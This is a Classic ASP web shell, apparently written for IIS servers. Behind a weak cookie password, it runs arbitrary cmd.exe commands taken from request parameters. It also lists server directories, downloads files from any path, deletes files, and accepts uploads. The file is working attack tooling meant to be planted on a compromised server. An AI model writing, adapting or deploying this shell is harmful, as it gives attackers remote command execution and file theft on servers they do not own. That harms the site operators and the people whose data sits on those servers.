<%@ Language=VBScript %>
<%
Const PASSWORD = "123"

Dim output : output = ""

' ===================== AUTHENTICATION =====================
Dim auth
auth = Request.Cookies("auth")
If auth <> PASSWORD Then
    Response.Write "<form method='post'><input type='password' name='auth'/><input type='submit' value='Login'/></form>"
    If Request.Form("auth") = PASSWORD Then
        Response.Cookies("auth") = PASSWORD
        Response.Redirect Request.ServerVariables("SCRIPT_NAME")
    End If
    Response.End
End If

' ===================== VARIABLES =====================
Dim path : path = Trim(Request("path"))
If path = "" Then path = Server.MapPath(".")

Dim cmd, download, del
cmd = Request("cmd")
download = Request("download")
del = Request("delete")

' ===================== FILE UPLOAD (Pure Classic ASP) =====================
If Request.ServerVariables("REQUEST_METHOD") = "POST" And Request.Form("upload") = "1" Then
    On Error Resume Next
    Dim fso, fileName, savePath
    
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    
    ' Get uploaded file info
    fileName = Request.Form("file")  ' This is just filename, not full file
    If fileName <> "" Then
        savePath = path & "\" & fso.GetFileName(fileName)
        
        ' Note: Pure Classic ASP mein binary upload ke liye extra code chahiye
        ' Simple version - agar component installed hai to yeh kaam karega
        Dim uploadData
        uploadData = Request.BinaryRead(Request.TotalBytes)
        
        ' Basic save (better version needed for real use)
        Dim binStream
        Set binStream = Server.CreateObject("ADODB.Stream")
        binStream.Type = 1
        binStream.Open
        binStream.Write uploadData
        binStream.SaveToFile savePath, 2
        binStream.Close
        
        If Err.Number = 0 Then
            output = "✅ File uploaded successfully: " & fso.GetFileName(savePath)
        Else
            output = "❌ Upload Error: " & Err.Description
        End If
    Else
        output = "No file selected!"
    End If
    On Error GoTo 0
End If

' ===================== DELETE, CMD, DOWNLOAD (same as before) =====================
If del <> "" Then
    On Error Resume Next
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    Dim fileToDel : fileToDel = path & "\" & del
    If fso.FileExists(fileToDel) Then fso.DeleteFile fileToDel : output = "File deleted: " & del
    On Error GoTo 0
End If

If cmd <> "" Then
    On Error Resume Next
    Dim WShell, exec
    Set WShell = Server.CreateObject("WScript.Shell")
    Set exec = WShell.Exec("cmd.exe /c " & cmd)
    output = exec.StdOut.ReadAll & exec.StdErr.ReadAll
    On Error GoTo 0
End If

If download <> "" Then
    Dim stream
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.LoadFromFile download
    Response.ContentType = "application/octet-stream"
    Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(download, InStrRev(download,"\")+1)
    Response.BinaryWrite stream.Read
    stream.Close
    Response.End
End If
%>

<html>
<head>
    <title>Classic ASP Web Shell</title>
    <style>body{font-family:monospace; background:#111; color:#0f0;}</style>
</head>
<body>
    <h2>Classic ASP Web Shell</h2>

    <form method="get">
        Path: <input type="text" name="path" value="<%=Server.HTMLEncode(path)%>" style="width:600px"/>
        <input type="submit" value="Browse"/>
    </form>

    <form method="get">
        Command: <input type="text" name="cmd" style="width:500px"/>
        <input type="submit" value="Run"/>
    </form>

    <!-- Upload Form -->
    <form method="post" enctype="multipart/form-data">
        <input type="hidden" name="upload" value="1">
        <input type="hidden" name="path" value="<%=Server.HTMLEncode(path)%>"/>
        Upload File: <input type="file" name="file"/>
        <input type="submit" value="Upload"/>
    </form>
    <hr>

    <pre><%=Server.HTMLEncode(output)%></pre>
    <%= ListFiles(path) %>
</body>
</html>

<%
Function ListFiles(p)
    Dim html : html = "<h3>Index of " & Server.HTMLEncode(p) & "</h3><ul>"
    Dim fso, folder, item
    On Error Resume Next
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    If fso.FolderExists(p) Then
        Set folder = fso.GetFolder(p)
        For Each item In folder.SubFolders
            html = html & "<li><a href='?path=" & Server.URLEncode(item.Path) & "'><b>[" & Server.HTMLEncode(item.Name) & "]</b></a></li>"
        Next
        For Each item In folder.Files
            html = html & "<li>" & Server.HTMLEncode(item.Name) & " - " & _
                         "<a href='?download=" & Server.URLEncode(item.Path) & "'>[Download]</a> | " & _
                         "<a href='?delete=" & Server.URLEncode(item.Name) & "'>[Delete]</a></li>"
        Next
    End If
    ListFiles = html & "</ul>"
End Function
%>
